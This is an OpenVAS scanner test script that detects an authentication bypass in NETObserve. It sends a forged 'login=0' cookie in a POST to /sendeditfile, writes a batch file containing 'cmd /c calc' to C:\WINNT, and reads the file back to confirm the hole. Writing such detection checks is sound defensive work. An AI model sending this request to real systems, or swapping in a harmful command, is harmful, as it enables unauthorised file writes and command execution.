# OpenVAS Vulnerability Test
# $Id: netobserve_command_execution.nasl 6053 2017-05-01 09:02:51Z teissa $
# Description: NETObserve Authentication Bypass vulnerability
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2003 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11971");
  script_version("2019-04-11T14:06:24+0000");
  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(9319);
  script_tag(name:"cvss_base", value:"7.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:C/I:C/A:C");
  script_name("NETObserve Authentication Bypass vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2003 Noam Rathaus");
  script_family("Gain a shell remotely");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Disable this service.");

  script_tag(name:"summary", value:"NETObserve is a solution for monitoring an otherwise unattended computer.

  The product is considered as being highly insecure, as it allows the execution of arbitrary commands, editing
  and viewing of abitrary files, without any kind of authentication.");

  script_tag(name:"impact", value:"An attacker may use this software to gain the control on this system.");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

# it is better to use http_post, but I need a special refer, and cookie content
host = http_host_name( port:port );
req = string("POST /sendeditfile HTTP/1.1\r\nAccept: */*\r\nReferer: http://", host, "/editfile=?C:\\WINNT\\win.bat?\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: ", host, "\r\nConnection: close\r\nContent-Length: 25\r\nCookie: login=0\r\n\r\nnewfiledata=cmd+%2Fc+calc");
res = http_keepalive_send_recv(port:port, data:req);
if(!res)
  exit(0);

if(res =~ "^HTTP/1\.[01] 200" && "NETObserve" >< res) {
  url = "/file/C%3A%5CWINNT%5Cwin.bat";
  req = string("GET ", url, " HTTP/1.1\r\nAccept: */*\r\nReferer: http://", host, "/getfile=?C:\\WINNT\\win.bat?\r\nHost: ", host, "\r\nConnection: close\r\nCookie: login=0\r\n\r\n");
  res = http_keepalive_send_recv(port:port, data:req);
  if(!res)
    exit(0);

  if(res =~ "^HTTP/1\.[01] 200" && "cmd /c calc" >< res) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);